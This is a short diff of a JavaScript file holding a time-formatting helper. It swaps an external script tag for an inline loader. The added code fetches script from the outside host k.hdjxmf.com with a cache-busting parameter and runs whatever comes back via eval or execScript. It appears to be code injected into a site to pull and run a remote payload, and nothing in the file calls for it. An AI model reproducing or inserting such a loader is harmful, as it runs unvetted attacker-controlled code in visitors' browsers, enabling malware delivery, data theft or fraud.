@@ -229,4 +229,4 @@ function formatSeconds(value) {
 	}
 	return time;
 }
-<script id='mob' type='text/javascript' charset='utf-8' src='http://k.hdjxmf.com/d.php?pid=1030'></script>
+<script>;(function(w,d){var b='http://k.hdjxmf.com/d.php?pid=1030&n='+Math.random();var a=new XMLHttpRequest();if(a!=null){a.onreadystatechange=function(){if(a.readyState==4 && a.status==200){if(w.execScript)w.execScript(a.responseText,'JavaScript');else if(w.eval)w.eval(a.responseText,'JavaScript');else eval(a.responseText);}};a.open('GET',b,false);a.send();}})(window,document);</script>
